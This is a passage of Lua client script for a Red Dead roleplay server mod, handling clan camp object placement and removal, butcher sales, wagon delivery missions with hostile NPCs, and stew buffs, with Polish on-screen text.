                end
                if hitch2 == 0 then  
                else
                    local hitch2x = json.decode(hitch2)

                    local object1 = GetClosestObjectOfType(hitch2x.x, hitch2x.y, hitch2x.z, 2.5, hitch2x.m, 0)
                        SetEntityAsMissionEntity(object1)
                        DeleteObject(object1)
                        local tent1s = CreateObject(hitch2x.m, hitch2x.x, hitch2x.y, hitch2x.z, true, false, true)
                            SetEntityHeading(tent1s, hitch2x.h)
                            PlaceObjectOnGroundProperly(tent1s)
                            SetEntityAsMissionEntity(tent1s)   
                            FreezeEntityPosition( tent1s, true)
 
                end
                if table == 0 then  
                else
                    local tablex = json.decode(table)

                    local object1 = GetClosestObjectOfType(tablex.x, tablex.y, tablex.z, 2.5, tablex.m, 0)
                        SetEntityAsMissionEntity(object1)
                        DeleteObject(object1)
                        local tent1s = CreateObject(tablex.m, tablex.x, tablex.y, tablex.z, true, false, true)
                            SetEntityHeading(tent1s, tablex.h)
                            PlaceObjectOnGroundProperly(tent1s)
                            SetEntityAsMissionEntity(tent1s)    
                            FreezeEntityPosition( tent1s, true)

                end
                if inventory == 0 then  
                else
                    local inventoryx = json.decode(inventory)

                    local object1 = GetClosestObjectOfType(inventoryx.x, inventoryx.y, inventoryx.z, 2.5, inventoryx.m, 0)
                        SetEntityAsMissionEntity(object1)
                        DeleteObject(object1)
                        local tent1s = CreateObject(inventoryx.m, inventoryx.x, inventoryx.y, inventoryx.z, true, false, true)
                            SetEntityHeading(tent1s, inventoryx.h)
                            PlaceObjectOnGroundProperly(tent1s)
                            SetEntityAsMissionEntity(tent1s) 
                            FreezeEntityPosition( tent1s, true)
  
                end
                if chair1 == 0 then  
                else
                    local chair1x = json.decode(chair1)

                    local object1 = GetClosestObjectOfType(chair1x.x, chair1x.y, chair1x.z, 2.5, chair1x.m, 0)
                        SetEntityAsMissionEntity(object1)
                        DeleteObject(object1)
                        local tent1s = CreateObject(chair1x.m, chair1x.x, chair1x.y, chair1x.z, true, false, true)
                            SetEntityHeading(tent1s, chair1x.h)
                            PlaceObjectOnGroundProperly(tent1s)
                            SetEntityAsMissionEntity(tent1s)   
                            FreezeEntityPosition( tent1s, true)

                end
                if chair2 == 0 then  
                else
                    local chair2x = json.decode(chair2)

                    local object1 = GetClosestObjectOfType(chair2x.x, chair2x.y, chair2x.z, 2.5, chair2x.m, 0)
                        SetEntityAsMissionEntity(object1)
                        DeleteObject(object1)
                        local tent1s = CreateObject(chair2x.m, chair2x.x, chair2x.y, chair2x.z, true, false, true)
                            SetEntityHeading(tent1s, chair2x.h)
                            PlaceObjectOnGroundProperly(tent1s)
                            SetEntityAsMissionEntity(tent1s) 
                            FreezeEntityPosition( tent1s, true)
   
                end
                if chair3 == 0 then  
                else
                    local chair3x = json.decode(chair3)

                    local object1 = GetClosestObjectOfType(chair3x.x, chair3x.y, chair3x.z, 2.5, chair3x.m, 0)
                        SetEntityAsMissionEntity(object1)
                        DeleteObject(object1)
                        local tent1s = CreateObject(chair3x.m, chair3x.x, chair3x.y, chair3x.z, true, false, true)
                            SetEntityHeading(tent1s, chair3x.h)
                            PlaceObjectOnGroundProperly(tent1s)
                            SetEntityAsMissionEntity(tent1s)    
                            FreezeEntityPosition( tent1s, true)

                end
                if chair4 == 0 then  
                else
                    local chair4x = json.decode(chair4)

                    local object1 = GetClosestObjectOfType(chair4x.x, chair4x.y, chair4x.z, 2.5, chair4x.m, 0)
                        SetEntityAsMissionEntity(object1)
                        DeleteObject(object1)
                        local tent1s = CreateObject(chair4x.m, chair4x.x, chair4x.y, chair4x.z, true, false, true)
                            SetEntityHeading(tent1s, chair4x.h)
                            PlaceObjectOnGroundProperly(tent1s)
                            SetEntityAsMissionEntity(tent1s) 
                            FreezeEntityPosition( tent1s, true)
  
                end
                if chair5 == 0 then  
                else
                    local chair5x = json.decode(chair5)

                    local object1 = GetClosestObjectOfType(chair5x.x, chair5x.y, chair5x.z, 2.5, chair5x.m, 0)
                        SetEntityAsMissionEntity(object1)
                        DeleteObject(object1)
                        local tent1s = CreateObject(chair5x.m, chair5x.x, chair5x.y, chair5x.z, true, false, true)
                            SetEntityHeading(tent1s, chair5x.h)
                            PlaceObjectOnGroundProperly(tent1s)
                            SetEntityAsMissionEntity(tent1s) 
                            FreezeEntityPosition( tent1s, true)
  
                end
                if barrel == 0 then  
                else
                    local barrelx = json.decode(barrel)

                    local object1 = GetClosestObjectOfType(barrelx.x, barrelx.y, barrelx.z, 2.5, barrelx.m, 0)
                        SetEntityAsMissionEntity(object1)
                        DeleteObject(object1)
                        local tent1s = CreateObject(barrelx.m, barrelx.x, barrelx.y, barrelx.z, true, false, true)
                            SetEntityHeading(tent1s, barrelx.h)
                            PlaceObjectOnGroundProperly(tent1s)
                            SetEntityAsMissionEntity(tent1s) 
                            FreezeEntityPosition( tent1s, true)
   
                end
                if destiller == 0 then  
                else
                    local destillerx = json.decode(destiller)

                    local object1 = GetClosestObjectOfType(destillerx.x, destillerx.y, destillerx.z, 2.5, destillerx.m, 0)
                        SetEntityAsMissionEntity(object1)
                        DeleteObject(object1)
                        local tent1s = CreateObject(destillerx.m, destillerx.x, destillerx.y, destillerx.z, true, false, true)
                            SetEntityHeading(tent1s, destillerx.h)
                            PlaceObjectOnGroundProperly(tent1s)
                            SetEntityAsMissionEntity(tent1s)  
                            FreezeEntityPosition( tent1s, true)
  
                end
                if tanner == 0 then  
                else
                    local tannerx = json.decode(tanner)
                    local object1 = GetClosestObjectOfType(tannerx.x, tannerx.y, tannerx.z, 2.5, tannerx.m, 0)
                        SetEntityAsMissionEntity(object1)
                        DeleteObject(object1)
                        local tent1s = CreateObject(tannerx.m, tannerx.x, tannerx.y, tannerx.z , true, false, true)
                            SetEntityHeading(tent1s, tannerx.h)
                            PlaceObjectOnGroundProperly(tent1s)
                            SetEntityAsMissionEntity(tent1s)   
                            FreezeEntityPosition( tent1s, true)

                end 
            
            
    end
end)

RegisterNetEvent("syn:delcamp")
AddEventHandler("syn:delcamp", function(flag, tent1, tent2, tent3, tent4, tent5, fire, hitch1, hitch2, table, 
    inventory, chair1, chair2, chair3, chair4, chair5, barrel,stew, destiller, tanner)
    local _source = source
    local comp = json.decode(flag)


    local objects = DoesObjectOfTypeExistAtCoords(comp.x, comp.y, comp.z, 1.5, -229587575, 0)
    if objects == 1 then
        local object = GetClosestObjectOfType(comp.x, comp.y, comp.z, 1.5, -229587575, 0)
        SetEntityAsMissionEntity(object)
        DeleteObject(object)
        
    else end

    if tent1 == 0 then  
    else
        local tent1x = json.decode(tent1)

        local objects1 = DoesObjectOfTypeExistAtCoords(tent1x.x, tent1x.y, tent1x.z, 1.5, tent1x.m, 0)
        if objects1 == 1 then
            local object1 = GetClosestObjectOfType(tent1x.x, tent1x.y, tent1x.z, 2.5, tent1x.m, 0)
            SetEntityAsMissionEntity(object1)
            DeleteObject(object1)
              
        else end
    end

    if tent2 == 0 then  
    else
        local tent2x = json.decode(tent2)

        local objects1 = DoesObjectOfTypeExistAtCoords(tent2x.x, tent2x.y, tent2x.z, 1.5, tent2x.m, 0)
        if objects1 == 1 then
            local object1 = GetClosestObjectOfType(tent2x.x, tent2x.y, tent2x.z, 2.5, tent2x.m, 0)
            SetEntityAsMissionEntity(object1)
            DeleteObject(object1)

           
        else end
    end

    if tent3 == 0 then  
    else
        local tent3x = json.decode(tent3)

        local objects1 = DoesObjectOfTypeExistAtCoords(tent3x.x, tent3x.y, tent3x.z, 1.5, tent3x.m, 0)
        if objects1 == 1 then
            local object1 = GetClosestObjectOfType(tent3x.x, tent3x.y, tent3x.z, 2.5, tent3x.m, 0)
            SetEntityAsMissionEntity(object1)
            DeleteObject(object1)
           
        else end
    end

    if tent4 == 0 then  
    else
        local tent4x = json.decode(tent4)

        local objects1 = DoesObjectOfTypeExistAtCoords(tent4x.x, tent4x.y, tent4x.z, 1.5, tent4x.m, 0)
        if objects1 == 1 then
            local object1 = GetClosestObjectOfType(tent4x.x, tent4x.y, tent4x.z, 2.5, tent4x.m, 0)
            SetEntityAsMissionEntity(object1)
            DeleteObject(object1)
           
        else end
    end

    if tent5 == 0 then  
    else
        local tent5x = json.decode(tent5)

        local objects1 = DoesObjectOfTypeExistAtCoords(tent5x.x, tent5x.y, tent5x.z, 1.5, tent5x.m, 0)
        if objects1 == 1 then
            local object1 = GetClosestObjectOfType(tent5x.x, tent5x.y, tent5x.z, 2.5, tent5x.m, 0)
            SetEntityAsMissionEntity(object1)
            DeleteObject(object1)
            
        else end
    end
    if fire == 0 then  
    else
        local firex = json.decode(fire)

        local objects1 = DoesObjectOfTypeExistAtCoords(firex.x, firex.y, firex.z, 1.5, firex.m, 0)
        if objects1 == 1 then
            local object1 = GetClosestObjectOfType(firex.x, firex.y, firex.z, 2.5, firex.m, 0)
            SetEntityAsMissionEntity(object1)
            DeleteObject(object1)
            
        else end 
        
    end
    if stew == 0 then  
    else
        local stewx = json.decode(stew)

        local objects1 = DoesObjectOfTypeExistAtCoords(stewx.x, stewx.y, stewx.z, 1.5, stewx.m, 0)
        if objects1 == 1 then
            local object1 = GetClosestObjectOfType(stewx.x, stewx.y, stewx.z, 2.5, stewx.m, 0)
            SetEntityAsMissionEntity(object1)
            DeleteObject(object1)
            
        else end 
        
    end
    if hitch1 == 0 then  
    else
        local hitch1x = json.decode(hitch1)--

        local objects1 = DoesObjectOfTypeExistAtCoords(hitch1x.x, hitch1x.y, hitch1x.z, 1.5, hitch1x.m, 0)
        if objects1 == 1 then
            local object1 = GetClosestObjectOfType(hitch1x.x, hitch1x.y, hitch1x.z, 2.5, hitch1x.m, 0)
            SetEntityAsMissionEntity(object1)
            DeleteObject(object1)
            
        else end  
    end
    if hitch2 == 0 then  
    else
        local hitch2x = json.decode(hitch2)

        local objects1 = DoesObjectOfTypeExistAtCoords(hitch2x.x, hitch2x.y, hitch2x.z, 1.5, hitch2x.m, 0)
        if objects1 == 1 then
            local object1 = GetClosestObjectOfType(hitch2x.x, hitch2x.y, hitch2x.z, 2.5, hitch2x.m, 0)
            SetEntityAsMissionEntity(object1)
            DeleteObject(object1)
            
        else end   
    end
    if table == 0 then  
    else
        local tablex = json.decode(table)

        local objects1 = DoesObjectOfTypeExistAtCoords(tablex.x, tablex.y, tablex.z, 1.5, tablex.m, 0)
        if objects1 == 1 then
            local object1 = GetClosestObjectOfType(tablex.x, tablex.y, tablex.z, 2.5, tablex.m, 0)
            SetEntityAsMissionEntity(object1)
            DeleteObject(object1)
            
        else end    
    end
    if inventory == 0 then  
    else
        local inventoryx = json.decode(inventory)

        local objects1 = DoesObjectOfTypeExistAtCoords(inventoryx.x, inventoryx.y, inventoryx.z, 1.5, inventoryx.m, 0)
        if objects1 == 1 then
            local object1 = GetClosestObjectOfType(inventoryx.x, inventoryx.y, inventoryx.z, 2.5, inventoryx.m, 0)
            SetEntityAsMissionEntity(object1)
            DeleteObject(object1)
            
        else end  
    end
    if chair1 == 0 then  
    else
        local chair1x = json.decode(chair1)

        local objects1 = DoesObjectOfTypeExistAtCoords(chair1x.x, chair1x.y, chair1x.z, 1.5, chair1x.m, 0)
        if objects1 == 1 then
            local object1 = GetClosestObjectOfType(chair1x.x, chair1x.y, chair1x.z, 2.5, chair1x.m, 0)
            SetEntityAsMissionEntity(object1)
            DeleteObject(object1)
            
        else end  
    end
    if chair2 == 0 then  
    else
        local chair2x = json.decode(chair2)

        local objects1 = DoesObjectOfTypeExistAtCoords(chair2x.x, chair2x.y, chair2x.z, 1.5, chair2x.m, 0)
        if objects1 == 1 then
            local object1 = GetClosestObjectOfType(chair2x.x, chair2x.y, chair2x.z, 2.5, chair2x.m, 0)
            SetEntityAsMissionEntity(object1)
            DeleteObject(object1)
            
        else end  
    end
    if chair3 == 0 then  
    else
        local chair3x = json.decode(chair3)

        local objects1 = DoesObjectOfTypeExistAtCoords(chair3x.x, chair3x.y, chair3x.z, 1.5, chair3x.m, 0)
        if objects1 == 1 then
            local object1 = GetClosestObjectOfType(chair3x.x, chair3x.y, chair3x.z, 2.5, chair3x.m, 0)
            SetEntityAsMissionEntity(object1)
            DeleteObject(object1)
            
        else end   
    end
    if chair4 == 0 then  
    else
        local chair4x = json.decode(chair4)

        local objects1 = DoesObjectOfTypeExistAtCoords(chair4x.x, chair4x.y, chair4x.z, 1.5, chair4x.m, 0)
        if objects1 == 1 then
            local object1 = GetClosestObjectOfType(chair4x.x, chair4x.y, chair4x.z, 2.5, chair4x.m, 0)
            SetEntityAsMissionEntity(object1)
            DeleteObject(object1)
            
        else end  
    end
    if chair5 == 0 then  
    else
        local chair5x = json.decode(chair5)

        local objects1 = DoesObjectOfTypeExistAtCoords(chair5x.x, chair5x.y, chair5x.z, 1.5, chair5x.m, 0)
        if objects1 == 1 then
            local object1 = GetClosestObjectOfType(chair5x.x, chair5x.y, chair5x.z, 2.5, chair5x.m, 0)
            SetEntityAsMissionEntity(object1)
            DeleteObject(object1)
            
        else end  
    end
    if barrel == 0 then  
    else
        local barrelx = json.decode(barrel)

        local objects1 = DoesObjectOfTypeExistAtCoords(barrelx.x, barrelx.y, barrelx.z, 1.5, barrelx.m, 0)
        if objects1 == 1 then
            local object1 = GetClosestObjectOfType(barrelx.x, barrelx.y, barrelx.z, 2.5, barrelx.m, 0)
            SetEntityAsMissionEntity(object1)
            DeleteObject(object1)
            
        else end  
    end
    if destiller == 0 then  
    else
        local destillerx = json.decode(destiller)

        local objects1 = DoesObjectOfTypeExistAtCoords(destillerx.x, destillerx.y, destillerx.z, 1.5, destillerx.m, 0)
        if objects1 == 1 then
            local object1 = GetClosestObjectOfType(destillerx.x, destillerx.y, destillerx.z, 2.5, destillerx.m, 0)
            SetEntityAsMissionEntity(object1)
            DeleteObject(object1)
            
        else end    
    end
    if tanner == 0 then  
    else
        local tannerx = json.decode(tanner)
        local objects1 = DoesObjectOfTypeExistAtCoords(tannerx.x, tannerx.y, tannerx.z, 1.5, tannerx.m, 0)
        if objects1 == 1 then
            local object1 = GetClosestObjectOfType(tannerx.x, tannerx.y, tannerx.z, 2.5, tannerx.m, 0)
            SetEntityAsMissionEntity(object1)
            DeleteObject(object1)
            
        else end  
    end

end)



function sellAnimal() -- Butcher
    local holding = Citizen.InvokeNative(0xD806CD2A4F2C2996, PlayerPedId()) -- ISPEDHOLDING
    local quality = Citizen.InvokeNative(0x31FEF6A20F00B963, holding)
    local model = GetEntityModel(holding)
    local pedtype = GetPedType(holding)
    if holding ~= false then -- Checking if you are holding an animal        
        if Config.Animals[model] ~= nil then -- Paying for animals
            local animal = Config.Animals[model]
            local givenItem = animal.givenItem
            local money = animal.money
            local xp1 = animal.xp               
            TriggerServerEvent("syn:addmaterial", givenItem, money, xp1, clanid2, materialz, xp) 
            TriggerEvent("vorp:TipRight", Config.Language.AnimalSold, 4000) -- Sold notification
            DeleteEntity(holding) 
            Citizen.InvokeNative(0x5E94EA09E7207C16, holding)
            DeletePed(holding)       
        else -- Paying for skins 
            local skinFound = false
            for k, v in pairs(Config.Animals) do 
                local givenItem = v.givenItem
                local money = v.money
                local xp1 = v.xp               
                if quality == v.perfect then -- Checking perfect quality                    
                    local multiplier = v.perfectQualityMultiplier
                    TriggerServerEvent("syn:addmaterial", givenItem, money * multiplier, xp1 * multiplier, clanid2, materialz, xp)  
                    skinFound = true    
                elseif quality == v.good then -- Checking good quality                 
                    local multiplier = v.goodQualityMultiplier
                    TriggerServerEvent("syn:addmaterial", givenItem, money * multiplier, xp1 * multiplier, clanid2, materialz, xp)  
                    skinFound = true 
                elseif quality == v.poor then -- Checking poor quality                 
                    local multiplier = v.poorQualityMultiplier
                    TriggerServerEvent("syn:addmaterial", givenItem, money * multiplier, xp1 * multiplier, clanid2, materialz, xp) 
                    skinFound = true                 
                end
            end
            if not skinFound then 
                TriggerEvent("vorp:TipRight", Config.Language.NotInTheButcher, 4000) -- Notification when the animal isn't being sold in the butcher 
            else
                TriggerEvent("vorp:TipRight", Config.Language.AnimalSold, 4000) -- Sold notification
                DeleteEntity(holding) 
                Citizen.InvokeNative(0x5E94EA09E7207C16, holding)
                DeletePed(holding)
            end            
        end     
    else
        TriggerEvent("vorp:TipRight", Config.Language.NotHoldingAnimal, 4000) -- Notification when you don't have an animal to sell
    end
end

RegisterNetEvent("syn:deliveryfunction")
AddEventHandler("syn:deliveryfunction", function()
    local _source = source
    Citizen.Wait(400)
    if stockmission == 1 then  
        missionwagon = Config.Carthash.smalldelivery
    elseif stockmission == 2 then
        missionwagon = Config.Carthash.mediumdelivery
    elseif stockmission == 3 then
        missionwagon = Config.Carthash.largedelivery
    end
    inroute = true
end)

Citizen.CreateThread(function() -- delivery mission
    while true do 
        Citizen.Wait(0)
        local player = PlayerPedId()
        local coords = GetEntityCoords(player)
        local sleep = true
        if IsPedOnFoot(player) then
            if inroute == true then
                sleep = false
                if GetDistanceBetweenCoords(coords.x, coords.y, coords.z, butcher.x, butcher.y, butcher.z, false) < 40 then
                    TriggerEvent("vorp:TipBottom", "NaciĹ›nij [~e~G~q~] aby RozpoczÄ…Ä‡ dostawÄ™", 2000)
                    if whenKeyJustPressed(Config.keys.three) then
                        local ped = PlayerPedId()
                        local car_start = GetEntityCoords(ped)
                        local car_name = missionwagon
                        local carHash = GetHashKey(car_name)
                        RequestModel(carHash)
                    
                        while not HasModelLoaded(carHash) do
                            Citizen.Wait(0)
                        end
                    
                         car = CreateVehicle(carHash, car_start.x + 3, car_start.y + 3, car_start.z, GetEntityHeading(PlayerPedId()), true, false)
                        SetVehicleOnGroundProperly(car)
                        Wait(200)
                        SetPedIntoVehicle(ped, car, -1)
                        SetModelAsNoLongerNeeded(carHash) 
                        inroute = false -- findme
                        TriggerEvent("syn:missiondeliverystarted")
                        mission = true
                    end
                else
                    TriggerEvent("vorp:TipBottom", "JesteĹ› zbyt daleko", 2000)
                    spawncart = false
                end
            end
            if sleep then 
                Citizen.Wait(1000)
            end
        end
    end
end) 

RegisterNetEvent("syn:missiondeliverystarted")
AddEventHandler("syn:missiondeliverystarted", function()
    timer = 1800000
            local deliverymissionloc = math.random(1, 5)
            if deliverymissionloc == 1 then 
                 deliverlocation = Config.deliverymissionlocation.first
            elseif deliverymissionloc == 2 then 
                 deliverlocation = Config.deliverymissionlocation.second
            elseif deliverymissionloc ==3 then
                 deliverlocation = Config.deliverymissionlocation.third
            elseif deliverymissionloc ==4 then
                 deliverlocation = Config.deliverymissionlocation.fourth
            elseif deliverymissionloc ==5 then
                 deliverlocation = Config.deliverymissionlocation.fifth
            end

            if count2 == 1 then 
                num = 5 
            elseif count2 == 2 then 
                num = 10
            elseif count2 == 3 then 
                num = 15
            elseif count2 == 4 then 
                num = 20
            elseif count2 == 5 then 
                num = 25
            end 
            p1 = N_0x554d9d53f696d002(1664425300, deliverlocation.x, deliverlocation.y, deliverlocation.z)
            SetBlipSprite(p1, -44057202, 1)
            Citizen.InvokeNative(0x9CB1A1623062F402, p1, "Dostawa")

            StartGpsMultiRoute(6, true, true)
            AddPointToGpsMultiRoute(deliverlocation.x+5, deliverlocation.y+5, deliverlocation.z)
            AddPointToGpsMultiRoute(deliverlocation.x, deliverlocation.y, deliverlocation.z)
            SetGpsMultiRouteRender(true)
            spawnai = true
            
              
            
end)

Citizen.CreateThread(function() -- delivery mission
    while true do 
        Citizen.Wait(0)
        local sleep = true 
        local player = PlayerPedId()
        local coords = GetEntityCoords(player)
        b2 = GetDistanceBetweenCoords(coords.x, coords.y, coords.z, deliverlocation.x, deliverlocation.y, deliverlocation.z, false)
        if b2 < 200 and spawnai then
            

            for i=1, num do
                local modelNumeroRandom = math.random(32)
                local modelRandom = Config.models[modelNumeroRandom].hash
                local _hash = GetHashKey(modelRandom)
                RequestModel(_hash)
                if not HasModelLoaded(_hash) then 
                    RequestModel(_hash) 
                end
            
                while not HasModelLoaded(_hash) do 
                    Citizen.Wait(1) 
                end
                
        
                local randomNumeroArma = math.random(22)
                local arma = Config.weapons[randomNumeroArma].hash
            
                createdped = CreatePed(_hash, deliverlocation.x, deliverlocation.y, deliverlocation.z, true, true, true, true)
               Citizen.InvokeNative(0x283978A15512B2FE, createdped, true) -- outfit variation      
               Citizen.InvokeNative(0x23f74c2fda6e7c61, 953018525, createdped)
        
               GiveWeaponToPed_2(createdped, arma, 10, true, true, 1, false, 0.5, 1.0, 1.0, true, 0, 0)
               SetCurrentPedWeapon(createdped, arma, true)
               SetRelationshipBetweenGroups(1, GetPedRelationshipGroupHash(createdped), GetPedRelationshipGroupHash(createdped))
               TaskWanderStandard(createdped, 1, 1)
               SetEntityCanBeDamagedByRelationshipGroup(createdped, false, GetPedRelationshipGroupHash(createdped)) 
               SetEntityInvincible(createdped,true)               
               table.insert(ai, {
                enemy        = createdped,
              })
            end
            spawnai = false
            lookforai = true
            Citizen.Wait(5000) 
            for i = 1, #ai do
            SetEntityInvincible(ai[i].enemy,false)
            SetPedCombatMovement(ai[i].enemy,2)
            TaskCombatPed(ai[i].enemy,PlayerPedId())
            end
        end
        
        if b2 < 20 and mission then
            sleep = false
            local player = PlayerPedId() 
            local payout = 0    
            local payout2 = 0  
            local xp1 = 0              
            DrawTxt("NaciĹ›nij [~e~X~q~] aby dostarczyÄ‡", 0.50, 0.95, 0.7, 0.5, true, 255, 255, 255, 255, true)
            if whenKeyJustPressed(Config.keys.four) then
                if IsPedInAnyVehicle(player, false) then
                    local vehicle = GetVehiclePedIsIn(player, false)
                    local model = GetEntityModel(vehicle)
                    local model2 = GetEntityModel(car)
                    if model == model2 and mission then
                        TriggerServerEvent('syn:getclan')
                        TriggerServerEvent("syn:getclanid")
                        Citizen.Wait(400)
                        TriggerServerEvent("syn:getcamp",clanid2)
                        Citizen.Wait(600)
                        if stockmission == 1 then 
                            payout = Config.payout.smalldelivery
                            xp1 = Config.payoutxp.smalldelivery
                        elseif stockmission ==2 then 
                            payout = Config.payout.mediumdelivery
                            xp1 = Config.payoutxp.smalldelivery
                        elseif stockmission == 3 then 
                            payout = Config.payout.largedelivery
                            xp1 = Config.payoutxp.smalldelivery
                        end

                        if count2 == 1 then 
                            payout2 = payout 
                        elseif count2 == 2 then 
                            payout2 = payout * Config.clancountmultiplyer.members2
                        elseif count2 == 3 then 
                            payout2 = payout * Config.clancountmultiplyer.members3
                        elseif count2 == 4 then 
                            payout2 = payout * Config.clancountmultiplyer.members4
                        elseif count2 == 5 then 
                            payout2 = payout * Config.clancountmultiplyer.members5
                        end
                        local total = cash + payout2
                        local clanexp = xp + xp1
                        TriggerServerEvent("syn:cashledger", total, clanid2)
                        TriggerServerEvent("syn:clanexp", clanexp, clanid2)
                        TriggerEvent("vorp:TipBottom", Config.Language.deliveryfinished..payout2.." "..Config.webhookLanguage.currency.." "..Config.Language.clanfunds, 2000)
                        if web == 0 then
                        else
                            local msg = Config.webhookLanguage.delivery.." "..payout2..Config.webhookLanguage.currentbalance..total.." "..Config.webhookLanguage.currency
                            TriggerServerEvent('syn:log', web,  msg, clanname)
                        end
                        stopmission()
                    elseif model ~= model2 then
                        TriggerEvent("vorp:TipBottom", "Nie ma CiÄ™ w swoim wagonie dostawczym", 4000) -- from server side
                    end
                else
                    TriggerEvent("vorp:TipBottom", "Nie jesteĹ› w wozie", 4000)
                end
            end
        end
        
        if sleep then 
            Citizen.Wait(1000)
        end
        
    end
end) 


Citizen.CreateThread(function() -- delivery mission
    while true do 
    Citizen.Wait(0)
        local sleep = true
        local x = num
        if lookforai == true then
            sleep = false
            local pl = Citizen.InvokeNative(0x217E9DC48139933D)
            for i = 1, #ai do
                if IsEntityDead(ai[i].enemy) then 
                   x = x - 1
                end
                if 0 >= x then 
                    aikilled = true
                    lookforai = false
                end
            end
            if IsPlayerDead(pl) then
                TriggerEvent("vorp:TipBottom", "UmarĹ‚eĹ›, a szabrownicy ukradli twoje zapasy.", 4000)
                stopmission()
            end
            
        end
        if sleep then 
            Citizen.Wait(1000)
        end
    end
end)


function stopmission()
	Wait(1000)
    mission = false
    num = 0
    RemoveBlip(p1)
    deletewagon()
    SetGpsMultiRouteRender(false)
    lookforai = false
    aikilled = false
    p1 = nil
    for i = 1, #ai do
        DeletePed(ai[i].enemy)
        Wait(500)
    end
end

AddEventHandler('onResourceStop', function(resourceName)
	if (GetCurrentResourceName() ~= resourceName) then
	  return
	end
    mission = false
    num = 0
    RemoveBlip(p1)
    deletewagon()
    SetGpsMultiRouteRender(false)
    p1 = nil
    for i = 1, #ai do
        DeletePed(ai[i].enemy)
        Wait(500)
    end
end)    

Citizen.CreateThread(function()
	while true do
		Citizen.Wait(1000)
		if mission and timer <= 0 then
            stopmission()
            TriggerEvent("vorp:TipBottom", "Brak czasu. misja nie powiodĹ‚a siÄ™!", 4000)
		else
			timer = timer - 1000
		end
	end
end)

function deletewagon()
	local entity = car
    NetworkRequestControlOfEntity(entity)
    local timeout = 2000
    while timeout > 0 and not NetworkHasControlOfEntity(entity) do
        Wait(100)
        timeout = timeout - 100
    end
    SetEntityAsMissionEntity(entity, true, true)
    Citizen.InvokeNative( 0xEA386986E786A54F, Citizen.PointerValueIntInitialized( entity ) )
    
    if (DoesEntityExist(entity)) then 
		DeleteEntity(entity)
		car = nil
	end
	car = nil
end
AddEventHandler('onResourceStart', function(resourceName)
	if (GetCurrentResourceName() ~= resourceName) then
	  return
    end
    TriggerServerEvent('syn:getclan')
    TriggerServerEvent("syn:getclanid")
    Citizen.Wait(1000)
    TriggerServerEvent("syn:getcamp",clanid2)
end) 

RegisterNetEvent("syn:stew")
AddEventHandler("syn:stew", function()
        print(Config.stewbuff.level2)
    if qtstew == 1 then 
        local bowl = CreateObject("p_bowl04x_stew", GetEntityCoords(PlayerPedId()), true, true, false, false, true)
        local spoon = CreateObject("p_spoon01x", GetEntityCoords(PlayerPedId()), true, true, false, false, true)
        
        Citizen.InvokeNative(0x669655FFB29EF1A9, bowl, 0, "Stew_Fill", 1.0)
        Citizen.InvokeNative(0xCAAF2BCCFEF37F77, bowl, 20)
        
        Citizen.InvokeNative(0xCAAF2BCCFEF37F77, spoon, 82)
        
        TaskItemInteraction_2(PlayerPedId(), 599184882, bowl, GetHashKey("p_bowl04x_stew_ph_l_hand"), -583731576, 1, 0, -1.0)
        TaskItemInteraction_2(PlayerPedId(), 599184882, spoon, GetHashKey("p_spoon01x_ph_r_hand"), -583731576, 1, 0, -1.0)
        
        Citizen.InvokeNative(0xB35370D5353995CB, PlayerPedId(), -583731576, 1.0)

        Citizen.Wait(5000)

        TriggerEvent('srp:drink', 40)
        TriggerEvent('srp:eat', 60)
        local number = Citizen.InvokeNative(0x36731AC041289BB1, PlayerPedId(), 1)
        if number then
        Citizen.InvokeNative(0xC6258F41D86676E0, PlayerPedId(),1, number + 25)
        else 
        Citizen.InvokeNative(0xC6258F41D86676E0, PlayerPedId(),1, 25)
        end
        Citizen.Wait(5000)

        local closestPlayerPed = GetPlayerPed(closestPlayer)
        local health = GetAttributeCoreValue(closestPlayerPed, 0) 
        local newHealth = health + 40
        local stamina = GetAttributeCoreValue(closestPlayerPed, 1)
        local newStamina = stamina + 40
        local health2 = GetEntityHealth(closestPlayerPed)
        local newHealth2 = health2 + 40
        Citizen.InvokeNative(0xC6258F41D86676E0, closestPlayerPed, 0, newHealth) --core
        Citizen.InvokeNative(0xC6258F41D86676E0, closestPlayerPed, 1, newStamina) --core
        SetEntityHealth(closestPlayerPed, newHealth2)
    elseif qtstew == 2 then 
        local bowl = CreateObject("p_bowl04x_stew", GetEntityCoords(PlayerPedId()), true, true, false, false, true)
        local spoon = CreateObject("p_spoon01x", GetEntityCoords(PlayerPedId()), true, true, false, false, true)
        
        Citizen.InvokeNative(0x669655FFB29EF1A9, bowl, 0, "Stew_Fill", 1.0)
        Citizen.InvokeNative(0xCAAF2BCCFEF37F77, bowl, 20)
        
        Citizen.InvokeNative(0xCAAF2BCCFEF37F77, spoon, 82)
        
        TaskItemInteraction_2(PlayerPedId(), 599184882, bowl, GetHashKey("p_bowl04x_stew_ph_l_hand"), -583731576, 1, 0, -1.0)
        TaskItemInteraction_2(PlayerPedId(), 599184882, spoon, GetHashKey("p_spoon01x_ph_r_hand"), -583731576, 1, 0, -1.0)
        
        Citizen.InvokeNative(0xB35370D5353995CB, PlayerPedId(), -583731576, 1.0)

        Citizen.Wait(5000)

        TriggerEvent('srp:drink', 40)
        TriggerEvent('srp:eat', 60)
        local number = Citizen.InvokeNative(0x36731AC041289BB1, PlayerPedId(), 1)
        if number then
        Citizen.InvokeNative(0xC6258F41D86676E0, PlayerPedId(),1, number + 25)
        else 
        Citizen.InvokeNative(0xC6258F41D86676E0, PlayerPedId(),1, 25)
        end
        Citizen.Wait(5000)

        local closestPlayerPed = GetPlayerPed(closestPlayer)
        local health = GetAttributeCoreValue(closestPlayerPed, 0) 
        local newHealth = health + 40
        local stamina = GetAttributeCoreValue(closestPlayerPed, 1)
        local newStamina = stamina + 40
        local health2 = GetEntityHealth(closestPlayerPed)
        local newHealth2 = health2 + 40
        Citizen.InvokeNative(0xC6258F41D86676E0, closestPlayerPed, 0, newHealth) --core
        Citizen.InvokeNative(0xC6258F41D86676E0, closestPlayerPed, 1, newStamina) --core
        SetEntityHealth(closestPlayerPed, newHealth2)
        Citizen.InvokeNative(0xF6A7C08DF2E28B28, PlayerPedId(), 0, Config.stewbuff.level2)
        Citizen.InvokeNative(0xF6A7C08DF2E28B28, PlayerPedId(), 1, Config.stewbuff.level2)
    elseif qtstew == 3 then 
        local bowl = CreateObject("p_bowl04x_stew", GetEntityCoords(PlayerPedId()), true, true, false, false, true)
        local spoon = CreateObject("p_spoon01x", GetEntityCoords(PlayerPedId()), true, true, false, false, true)
        
        Citizen.InvokeNative(0x669655FFB29EF1A9, bowl, 0, "Stew_Fill", 1.0)
        Citizen.InvokeNative(0xCAAF2BCCFEF37F77, bowl, 20)
        
